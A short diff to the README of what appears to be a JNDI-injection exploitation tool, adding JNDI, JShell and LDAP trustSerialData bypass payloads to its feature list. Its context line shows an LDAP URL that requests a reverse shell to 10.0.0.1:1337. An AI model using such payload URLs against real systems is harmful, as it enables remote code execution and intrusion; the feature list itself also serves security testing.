@@ -45,7 +45,9 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
   - JDBC RCE (MySQL/PostgreSQL/H2/Derby)
   - Tomcat Blind XXE
 - LDAP 反序列化 (包含常用 Gadget)
-- Nashorn JS 自定义 Payload
+- Nashorn JS 自定义 JNDI Payload
+- LDAP trustSerialData 绕过
+- JShell Payload 绕过 (可替代 Nashorn JS Engine)
 - UTF-8 Overlong Encoding 绕过
 
 ## 📖 使用指南
